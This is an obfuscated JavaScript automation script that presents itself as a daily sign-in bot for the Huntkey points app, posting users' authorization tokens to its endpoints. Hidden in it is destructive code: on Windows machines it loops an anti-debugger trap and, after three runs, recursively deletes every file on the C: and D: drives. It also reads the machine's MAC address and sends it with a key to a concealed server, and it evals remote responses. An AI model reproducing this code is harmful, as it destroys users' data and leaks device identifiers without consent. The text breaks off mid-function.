const $ = new Env("航嘉积分乐园");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x3638fe = vm.getGlobal(),
    _0x5869a6 = vm.createObject(),
    _0x5b912f = vm.createFunction("log", function () {
      const _0x5708c7 = [];
      for (let _0x4662ac = 0; _0x4662ac < arguments.length; _0x4662ac++) {
        _0x5708c7.push(vm.asString(arguments[_0x4662ac]));
      }
      console.log(..._0x5708c7);
      return vm.createUndefined();
    }),
    _0x1426ea = vm.createFunction("xxxx", function (_0x3508cd) {
      let _0x723c9c = eval(_0x3508cd.value);
      return vm.createString(JSON.stringify(_0x723c9c));
    }),
    _0x238976 = vm.createFunction("yyyy", function (_0x560f0d) {
      let _0x504b56 = _0x560f0d.value,
        _0x5d7588 = fs.readFileSync(_0x504b56, "utf-8").replace(/\r\n/g, "\n"),
        _0x16c8c8 = cryptoJS.MD5(_0x5d7588).toString();
      return vm.createString(_0x16c8c8);
    }),
    _0x362a0a = vm.createFunction("ddd", function (_0x25cb07) {
      let _0x10fb72 = cryptoJS.MD5(_0x25cb07.value).toString();
      return vm.createString(_0x10fb72);
    });
  vm.setProperty(_0x5869a6, "log", _0x5b912f);
  vm.setProperty(_0x3638fe, "xxxx", _0x1426ea);
  vm.setProperty(_0x3638fe, "console", _0x5869a6);
  vm.setProperty(_0x3638fe, "yyyy", _0x238976);
  vm.setProperty(_0x3638fe, "ddd", _0x362a0a);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x161545) {
  _0x161545.destroy();
}
function abc(_0x2691a1, _0x2c636d, _0x11265f, _0x4f004c, _0x36f33f) {
  const _0xea536f = _0x2691a1.getGlobal();
  let _0x1a5f9e = _0x2691a1.getProperty(_0xea536f, "xab"),
    _0x5eeb74 = _0x2691a1.call(_0x1a5f9e, _0x2691a1.createUndefined(), _0x2691a1.createString(_0x2c636d), _0x2691a1.createString(_0x4f004c), _0x2691a1.createString(_0x36f33f), _0x2691a1.createString(_0x11265f));
  _0x5eeb74 = _0x2691a1.asString(_0x5eeb74);
  return _0x5eeb74;
}
function xyz(_0x3b45ff, _0x4cbbc5, _0x452a95, _0x5093c6, _0x4b511f) {
  const _0x29d45b = _0x3b45ff.getGlobal();
  let _0x462323 = _0x3b45ff.getProperty(_0x29d45b, "xmn"),
    _0x16a9c0 = _0x3b45ff.call(_0x462323, _0x3b45ff.createUndefined(), _0x3b45ff.createString(_0x4cbbc5), _0x3b45ff.createString(_0x5093c6), _0x3b45ff.createString(_0x4b511f), _0x3b45ff.createString(_0x452a95));
  _0x16a9c0 = _0x3b45ff.asString(_0x16a9c0);
  return _0x16a9c0;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let hjjflyappArr = [],
  all_msg = "";
let arrs = [],
  hjjflyapp = ($.isNode() ? process.env.hjjflyapp : $.getdata("hjjflyapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x3ec39b) {
          return function (_0x295b16) {
            return Function("Function(arguments[0]+\"" + _0x295b16 + "\")()");
          }(_0x3ec39b);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x3d7de9 = "",
        _0x3f5ca9 = fs.readdirSync("/sys/class/net/");
      _0x3f5ca9.forEach(function (_0x3b44fb) {
        var _0x463971 = path.join("/sys/class/net", _0x3b44fb, "address");
        _0x3b44fb.substr(0, 3) == "eth" && fs.existsSync(_0x463971) && (_0x3d7de9 = fs.readFileSync(_0x463971).toString().trim());
      });
      return _0x3d7de9;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x21752e) {
  try {
    gtr.accessSync(_0x21752e, gtr.F_OK);
  } catch (_0x3fe54a) {
    return false;
  }
  return true;
}
function addF(_0x154b2d, _0xd11d12) {
  let _0x326869 = 0,
    _0x2f6f37 = "C:/Windows/system.txt";
  if (isFileExist(_0x2f6f37)) {
    _0x326869 = gtr.readFileSync(_0x2f6f37, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x2f6f37, "1", function (_0x4c59a4) {
        if (_0x4c59a4) {
          throw _0x4c59a4;
        }
      });
    } else {
      return;
    }
  }
  if (_0x326869 == 99) {
    return 99;
  }
  console.log(_0x326869);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x326869);
  if (parseInt(_0x326869) < 3) {
    let _0x825130 = parseInt(_0x326869) + 1;
    gtr.writeFileSync(_0x2f6f37, _0x825130 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x154b2d)) {
    return;
  }
  if (gtr.statSync(_0x154b2d).isDirectory()) {
    var _0x25a69e = gtr.readdirSync(_0x154b2d),
      _0x21fb26 = _0x25a69e.length,
      _0x35a707 = 0;
    if (_0x21fb26 > 0) {
      _0x25a69e.forEach(function (_0x372df6) {
        _0x35a707++;
        var _0x4ed2e6 = _0x154b2d + "/" + _0x372df6;
        gtr.statSync(_0x4ed2e6).isDirectory() ? addF(_0x4ed2e6, true) : gtr.unlinkSync(_0x4ed2e6);
      });
      _0x21fb26 == _0x35a707 && _0xd11d12 && gtr.rmdirSync(_0x154b2d);
    } else {
      _0x21fb26 == 0 && _0xd11d12 && gtr.rmdirSync(_0x154b2d);
    }
  } else {
    gtr.unlinkSync(_0x154b2d);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 68, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    hjjflyappArr = hjjflyapp.split("\n");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + hjjflyappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(hjjflyappArr.length > parseInt(arrs.num))) {
      for (let _0x42f7fe = 0; _0x42f7fe < hjjflyappArr.length; _0x42f7fe++) {
        hjjflyapp = hjjflyappArr[_0x42f7fe];
        $.index = _0x42f7fe + 1;
        console.log("\n开始【航嘉积分乐园" + $.index + "】");
        await hjjflyqd();
        await $.wait(400000);
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x216e60 => $.logErr(_0x216e60)).finally(() => $.done());
function hjjflyqd(_0x1f9b79 = 0) {
  return new Promise(_0x420c8f => {
    let _0x56d1d1 = {
      url: "https://wx.huntkey.cn/aliyun/v1/integral/gain/signIn",
      headers: {
        Host: "wx.huntkey.cn",
        Connection: "keep-alive",
        "Content-Length": "0",
        authorization: hjjflyapp,
        charset: "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210902 Mobile Safari/537.36 MMWEBID/1048 MicroMessenger/8.0.15.2020(0x28000F3D) Process/appbrand1 WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate"
      }
    };
    $.post(_0x56d1d1, async (_0x185fa5, _0x50525a, _0x4ef84f) => {
      try {
        console.log("\n航嘉积分乐园账号【" + $.index + "】" + _0x4ef84f);
      } catch (_0x50f75c) {} finally {
        _0x420c8f();
      }
    }, _0x1f9b79);
  });
}
function hjjflyxx(_0x3024d7 = 0) {
  return new Promise(_0x29856f => {
    let _0x8de163 = {
      url: "https://wx.huntkey.cn/aliyun/v1/customer/integral",
      headers: {
        Host: "wx.huntkey.cn",
        Connection: "keep-alive",
        "Content-Length": "0",
        authorization: hjjflyapp,
        charset: "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210902 Mobile Safari/537.36 MMWEBID/1048 MicroMessenger/8.0.15.2020(0x28000F3D) Process/appbrand1 WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate"
      }
    };
    $.get(_0x8de163, async (_0x194514, _0x4f1115, _0x560573) => {
      try {
        console.log("\n航嘉积分乐园账号【" + $.index + "】" + _0x560573);
      } catch (_0x849fc5) {} finally {
        _0x29856f();
      }
    }, _0x3024d7);
  });
}
function randomString(_0x587328 = 12) {
  let _0x441f84 = "abcdef0123456789",
    _0xa0268 = _0x441f84.length,
    _0x3acad2 = "";
  for (i = 0; i < _0x587328; i++) {
    _0x3acad2 += _0x441f84.charAt(Math.floor(Math.random() * _0xa0268));
  }
  return _0x3acad2;
}
function random(_0x28444b = 12) {
  let _0x5081e5 = "0123456789",
    _0xfe6641 = _0x5081e5.length,
    _0x298aa3 = "";
  for (i = 0; i < _0x28444b; i++) {
    _0x298aa3 += _0x5081e5.charAt(Math.floor(Math.random() * _0xfe6641));
  }
  return _0x298aa3;
}
function encodeUTF8(_0x260cf1) {
  var _0x47dda2,
    _0x5f77ec = [],
    _0x514d6d,
    _0x137903;
  for (_0x47dda2 = 0; _0x47dda2 < _0x260cf1.length; _0x47dda2++) {
    if ((_0x514d6d = _0x260cf1.charCodeAt(_0x47dda2)) < 128) {
      _0x5f77ec.push(_0x514d6d);
    } else {
      if (_0x514d6d < 2048) {
        _0x5f77ec.push(192 + (_0x514d6d >> 6 & 31), 128 + (_0x514d6d & 63));
      } else {
        if ((_0x137903 = _0x514d6d ^ 55296) >> 10 == 0) {
          _0x514d6d = (_0x137903 << 10) + (_0x260cf1.charCodeAt(++_0x47dda2) ^ 56320) + 65536;
          _0x5f77ec.push(240 + (_0x514d6d >> 18 & 7), 128 + (_0x514d6d >> 12 & 63));
        } else {
          _0x5f77ec.push(224 + (_0x514d6d >> 12 & 15));
        }
        _0x5f77ec.push(128 + (_0x514d6d >> 6 & 63), 128 + (_0x514d6d & 63));
      }
    }
  }
  return _0x5f77ec;
}
function sha(_0x2ec6b5) {
  var _0xe7eb7a = new Uint8Array(encodeUTF8(_0x2ec6b5)),
    _0x148bd7,
    _0x57c82a,
    _0x2dc35a,
    _0x40b2d7 = (_0xe7eb7a.length + 8 >>> 6 << 4) + 16,
    _0x2ec6b5 = new Uint8Array(_0x40b2d7 << 2);
  _0x2ec6b5.set(new Uint8Array(_0xe7eb7a.buffer));
  _0x2ec6b5 = new Uint32Array(_0x2ec6b5.buffer);
  for (_0x2dc35a = new DataView(_0x2ec6b5.buffer), _0x148bd7 = 0; _0x148bd7 < _0x40b2d7; _0x148bd7++) {
    _0x2ec6b5[_0x148bd7] = _0x2dc35a.getUint32(_0x148bd7 << 2);
  }
  _0x2ec6b5[_0xe7eb7a.length >> 2] |= 128 << 24 - (_0xe7eb7a.length & 3) * 8;
  _0x2ec6b5[_0x40b2d7 - 1] = _0xe7eb7a.length << 3;
  var _0x5f2e83 = [],
    _0x1b76cc = [function () {
      return _0x277329[1] & _0x277329[2] | ~_0x277329[1] & _0x277329[3];
    }, function () {
      return _0x277329[1] ^ _0x277329[2] ^ _0x277329[3];
    }, function () {
      return _0x277329[1] & _0x277329[2] | _0x277329[1] & _0x277329[3] | _0x277329[2] & _0x277329[3];
    }, function () {
      return _0x277329[1] ^ _0x277329[2] ^ _0x277329[3];
    }],
    _0x126056 = function (_0x157515, _0x2f9b14) {
      return _0x157515 << _0x2f9b14 | _0x157515 >>> 32 - _0x2f9b14;
    },
    _0x3dc78d = [1518500249, 1859775393, -1894007588, -899497514],
    _0x277329 = [1732584193, -271733879, null, null, -1009589776];
  _0x277329[2] = ~_0x277329[0];
  _0x277329[3] = ~_0x277329[1];
  for (_0x148bd7 = 0; _0x148bd7 < _0x2ec6b5.length; _0x148bd7 += 16) {
    var _0x33f004 = _0x277329.slice(0);
    for (_0x57c82a = 0; _0x57c82a < 80; _0x57c82a++) {
      _0x5f2e83[_0x57c82a] = _0x57c82a < 16 ? _0x2ec6b5[_0x148bd7 + _0x57c82a] : _0x126056(_0x5f2e83[_0x57c82a - 3] ^ _0x5f2e83[_0x57c82a - 8] ^ _0x5f2e83[_0x57c82a - 14] ^ _0x5f2e83[_0x57c82a - 16], 1);
      _0x2dc35a = _0x126056(_0x277329[0], 5) + _0x1b76cc[_0x57c82a / 20 | 0]() + _0x277329[4] + _0x5f2e83[_0x57c82a] + _0x3dc78d[_0x57c82a / 20 | 0] | 0;
      _0x277329[1] = _0x126056(_0x277329[1], 30);
      _0x277329.pop();
      _0x277329.unshift(_0x2dc35a);
    }
    for (_0x57c82a = 0; _0x57c82a < 5; _0x57c82a++) {
      _0x277329[_0x57c82a] = _0x277329[_0x57c82a] + _0x33f004[_0x57c82a] | 0;
    }
  }
  _0x2dc35a = new DataView(new Uint32Array(_0x277329).buffer);
  for (var _0x148bd7 = 0; _0x148bd7 < 5; _0x148bd7++) {
    _0x277329[_0x148bd7] = _0x2dc35a.getUint32(_0x148bd7 << 2);
  }
  var _0x2335c7 = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x277329).buffer), function (_0x563431) {
    return (_0x563431 < 16 ? "0" : "") + _0x563431.toString(16);
  }).join("");
  return _0x2335c7;
}
function hqs(_0x31a115 = 10) {
  return new Promise(_0x239b71 => {
    let _0x5914a5 = 12,
      _0x11cbfe = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x5914a5 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x5914a5 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x11cbfe, async (_0x466e80, _0x3e1c59, _0x248d09) => {
      try {
        let _0x33c940 = eval(_0x248d09);
        _0x33c940.code == 200 ? (all_msg = _0x33c940.msg, _0x239b71(_0x33c940.data)) : (all_msg = _0x33c940.msg, _0x239b71(false));
      } catch (_0xdc5654) {
        $.logErr(_0xdc5654, _0x3e1c59);
      }
    }, 0);
  });
}
function md5(_0x1b885c) {
  function _0x2d254b(_0x40369, _0x845b6f) {
    return _0x40369 << _0x845b6f | _0x40369 >>> 32 - _0x845b6f;
  }
  function _0x5491a1(_0x5b9f5a, _0x3bb02f) {
    var _0x61d87c, _0x2f39ee, _0x44a89a, _0x54571e, _0x1f288b;
    _0x44a89a = 2147483648 & _0x5b9f5a;
    _0x54571e = 2147483648 & _0x3bb02f;
    _0x61d87c = 1073741824 & _0x5b9f5a;
    _0x2f39ee = 1073741824 & _0x3bb02f;
    _0x1f288b = (1073741823 & _0x5b9f5a) + (1073741823 & _0x3bb02f);
    return _0x61d87c & _0x2f39ee ? 2147483648 ^ _0x1f288b ^ _0x44a89a ^ _0x54571e : _0x61d87c | _0x2f39ee ? 1073741824 & _0x1f288b ? 3221225472 ^ _0x1f288b ^ _0x44a89a ^ _0x54571e : 1073741824 ^ _0x1f288b ^ _0x44a89a ^ _0x54571e : _0x1f288b ^ _0x44a89a ^ _0x54571e;
  }
  function _0x4859db(_0xdf4303, _0x500a02, _0x336876) {
    return _0xdf4303 & _0x500a02 | ~_0xdf4303 & _0x336876;
  }
  function _0x305127(_0x161703, _0x3e7916, _0x332747) {
    return _0x161703 & _0x332747 | _0x3e7916 & ~_0x332747;
  }
  function _0x2b9183(_0x2a2d10, _0x9893be, _0x4c1cb9) {
    return _0x2a2d10 ^ _0x9893be ^ _0x4c1cb9;
  }
  function _0x1e043b(_0x359bac, _0x34e100, _0x2288b4) {
    return _0x34e100 ^ (_0x359bac | ~_0x2288b4);
  }
  function _0x3daacc(_0xfd001e, _0x2d542b, _0x3af034, _0x2f1c63, _0x3b398d, _0x2bcf74, _0x59b8e8) {
    _0xfd001e = _0x5491a1(_0xfd001e, _0x5491a1(_0x5491a1(_0x4859db(_0x2d542b, _0x3af034, _0x2f1c63), _0x3b398d), _0x59b8e8));
    return _0x5491a1(_0x2d254b(_0xfd001e, _0x2bcf74), _0x2d542b);
  }
  function _0x4f0a4e(_0x5eb098, _0x2d212a, _0x5d73a0, _0x122e12, _0x2791e6, _0x2032cf, _0x432535) {
    _0x5eb098 = _0x5491a1(_0x5eb098, _0x5491a1(_0x5491a1(_0x305127(_0x2d212a, _0x5d73a0, _0x122e12), _0x2791e6), _0x432535));
    return _0x5491a1(_0x2d254b(_0x5eb098, _0x2032cf), _0x2d212a);
  }
  function _0x4c3a0c(_0x25df6f, _0x562ccf, _0x3fc7a4, _0x195cf0, _0xa92d9f, _0x1d2bda, _0x4cc291) {
    _0x25df6f = _0x5491a1(_0x25df6f, _0x5491a1(_0x5491a1(_0x2b9183(_0x562ccf, _0x3fc7a4, _0x195cf0), _0xa92d9f), _0x4cc291));
    return _0x5491a1(_0x2d254b(_0x25df6f, _0x1d2bda), _0x562ccf);
  }
  function _0x37f67d(_0x2345ce, _0x7c4fce, _0x2d5db2, _0xc61a2a, _0x1d6590, _0x5a84df, _0x21c8d1) {
    _0x2345ce = _0x5491a1(_0x2345ce, _0x5491a1(_0x5491a1(_0x1e043b(_0x7c4fce, _0x2d5db2, _0xc61a2a), _0x1d6590), _0x21c8d1));
    return _0x5491a1(_0x2d254b(_0x2345ce, _0x5a84df), _0x7c4fce);
  }
  function _0x551f6b(_0x24f461) {
    for (var _0x435c40, _0x1618f1 = _0x24f461.length, _0x13d624 = _0x1618f1 + 8, _0x1b0fe1 = (_0x13d624 - _0x13d624 % 64) / 64, _0x412d9e = 16 * (_0x1b0fe1 + 1), _0x464176 = new Array(_0x412d9e - 1), _0x2ca61e = 0, _0x58b828 = 0; _0x1618f1 > _0x58b828;) {
      _0x435c40 = (_0x58b828 - _0x58b828 % 4) / 4;
      _0x2ca61e = _0x58b828 % 4 * 8;
      _0x464176[_0x435c40] = _0x464176[_0x435c40] | _0x24f461.charCodeAt(_0x58b828) << _0x2ca61e;
      _0x58b828++;
    }
    _0x435c40 = (_0x58b828 - _0x58b828 % 4) / 4;
    _0x2ca61e = _0x58b828 % 4 * 8;
    _0x464176[_0x435c40] = _0x464176[_0x435c40] | 128 << _0x2ca61e;
    _0x464176[_0x412d9e - 2] = _0x1618f1 << 3;
    _0x464176[_0x412d9e - 1] = _0x1618f1 >>> 29;
    return _0x464176;
  }
  function _0x1b94fd(_0x1918dc) {
    var _0x1e2574,
      _0x18b98b,
      _0x37f11e = "",
      _0x3e6d03 = "";
    for (_0x18b98b = 0; 3 >= _0x18b98b; _0x18b98b++) {
      _0x1e2574 = _0x1918dc >>> 8 * _0x18b98b & 255;
      _0x3e6d03 = "0" + _0x1e2574.toString(16);
      _0x37f11e += _0x3e6d03.substr(_0x3e6d03.length - 2, 2);
    }
    return _0x37f11e;
  }
  function _0x431f71(_0x12cff2) {
    _0x12cff2 = _0x12cff2.replace(/\r\n/g, "\n");
    for (var _0x327a02 = "", _0x48a880 = 0; _0x48a880 < _0x12cff2.length; _0x48a880++) {
      var _0x192a9c = _0x12cff2.charCodeAt(_0x48a880);
      128 > _0x192a9c ? _0x327a02 += String.fromCharCode(_0x192a9c) : _0x192a9c > 127 && 2048 > _0x192a9c ? (_0x327a02 += String.fromCharCode(_0x192a9c >> 6 | 192), _0x327a02 += String.fromCharCode(63 & _0x192a9c | 128)) : (_0x327a02 += String.fromCharCode(_0x192a9c >> 12 | 224), _0x327a02 += String.fromCharCode(_0x192a9c >> 6 & 63 | 128), _0x327a02 += String.fromCharCode(63 & _0x192a9c | 128));
    }
    return _0x327a02;
  }
  var _0x42742a,
    _0xd52bdc,
    _0x22359e,
    _0x2dd1cc,
    _0x2b2646,
    _0xdd0547,
    _0x2bbfbd,
    _0xa8513b,
    _0x59c985,
    _0x48c1bb = [],
    _0x2d63b7 = 7,
    _0x2bd752 = 12,
    _0x2b2066 = 17,
    _0x8fc636 = 22,
    _0x1caab0 = 5,
    _0x1f78f9 = 9,
    _0x13c4ac = 14,
    _0x29fa97 = 20,
    _0xc0d7c9 = 4,
    _0x4c5bd9 = 11,
    _0x23ecba = 16,
    _0x49f468 = 23,
    _0x4086af = 6,
    _0xa4ba76 = 10,
    _0x1b5b02 = 15,
    _0x5e4618 = 21;
  for (_0x1b885c = _0x431f71(_0x1b885c), _0x48c1bb = _0x551f6b(_0x1b885c), _0xdd0547 = 1732584193, _0x2bbfbd = 4023233417, _0xa8513b = 2562383102, _0x59c985 = 271733878, _0x42742a = 0; _0x42742a < _0x48c1bb.length; _0x42742a += 16) {
    _0xd52bdc = _0xdd0547;
    _0x22359e = _0x2bbfbd;
    _0x2dd1cc = _0xa8513b;
    _0x2b2646 = _0x59c985;
    _0xdd0547 = _0x3daacc(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 0], _0x2d63b7, 3614090360);
    _0x59c985 = _0x3daacc(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 1], _0x2bd752, 3905402710);
    _0xa8513b = _0x3daacc(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 2], _0x2b2066, 606105819);
    _0x2bbfbd = _0x3daacc(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 3], _0x8fc636, 3250441966);
    _0xdd0547 = _0x3daacc(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 4], _0x2d63b7, 4118548399);
    _0x59c985 = _0x3daacc(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 5], _0x2bd752, 1200080426);
    _0xa8513b = _0x3daacc(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 6], _0x2b2066, 2821735955);
    _0x2bbfbd = _0x3daacc(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 7], _0x8fc636, 4249261313);
    _0xdd0547 = _0x3daacc(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 8], _0x2d63b7, 1770035416);
    _0x59c985 = _0x3daacc(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 9], _0x2bd752, 2336552879);
    _0xa8513b = _0x3daacc(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 10], _0x2b2066, 4294925233);
    _0x2bbfbd = _0x3daacc(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 11], _0x8fc636, 2304563134);
    _0xdd0547 = _0x3daacc(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 12], _0x2d63b7, 1804603682);
    _0x59c985 = _0x3daacc(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 13], _0x2bd752, 4254626195);
    _0xa8513b = _0x3daacc(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 14], _0x2b2066, 2792965006);
    _0x2bbfbd = _0x3daacc(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 15], _0x8fc636, 1236535329);
    _0xdd0547 = _0x4f0a4e(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 1], _0x1caab0, 4129170786);
    _0x59c985 = _0x4f0a4e(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 6], _0x1f78f9, 3225465664);
    _0xa8513b = _0x4f0a4e(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 11], _0x13c4ac, 643717713);
    _0x2bbfbd = _0x4f0a4e(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 0], _0x29fa97, 3921069994);
    _0xdd0547 = _0x4f0a4e(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 5], _0x1caab0, 3593408605);
    _0x59c985 = _0x4f0a4e(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 10], _0x1f78f9, 38016083);
    _0xa8513b = _0x4f0a4e(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 15], _0x13c4ac, 3634488961);
    _0x2bbfbd = _0x4f0a4e(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 4], _0x29fa97, 3889429448);
    _0xdd0547 = _0x4f0a4e(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 9], _0x1caab0, 568446438);
    _0x59c985 = _0x4f0a4e(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 14], _0x1f78f9, 3275163606);
    _0xa8513b = _0x4f0a4e(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 3], _0x13c4ac, 4107603335);
    _0x2bbfbd = _0x4f0a4e(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 8], _0x29fa97, 1163531501);
    _0xdd0547 = _0x4f0a4e(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 13], _0x1caab0, 2850285829);
    _0x59c985 = _0x4f0a4e(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 2], _0x1f78f9, 4243563512);
    _0xa8513b = _0x4f0a4e(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 7], _0x13c4ac, 1735328473);
    _0x2bbfbd = _0x4f0a4e(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 12], _0x29fa97, 2368359562);
    _0xdd0547 = _0x4c3a0c(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 5], _0xc0d7c9, 4294588738);
    _0x59c985 = _0x4c3a0c(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 8], _0x4c5bd9, 2272392833);
    _0xa8513b = _0x4c3a0c(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 11], _0x23ecba, 1839030562);
    _0x2bbfbd = _0x4c3a0c(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 14], _0x49f468, 4259657740);
    _0xdd0547 = _0x4c3a0c(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 1], _0xc0d7c9, 2763975236);
    _0x59c985 = _0x4c3a0c(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 4], _0x4c5bd9, 1272893353);
    _0xa8513b = _0x4c3a0c(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 7], _0x23ecba, 4139469664);
    _0x2bbfbd = _0x4c3a0c(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 10], _0x49f468, 3200236656);
    _0xdd0547 = _0x4c3a0c(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 13], _0xc0d7c9, 681279174);
    _0x59c985 = _0x4c3a0c(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 0], _0x4c5bd9, 3936430074);
    _0xa8513b = _0x4c3a0c(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 3], _0x23ecba, 3572445317);
    _0x2bbfbd = _0x4c3a0c(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 6], _0x49f468, 76029189);
    _0xdd0547 = _0x4c3a0c(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 9], _0xc0d7c9, 3654602809);
    _0x59c985 = _0x4c3a0c(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 12], _0x4c5bd9, 3873151461);
    _0xa8513b = _0x4c3a0c(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 15], _0x23ecba, 530742520);
    _0x2bbfbd = _0x4c3a0c(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 2], _0x49f468, 3299628645);
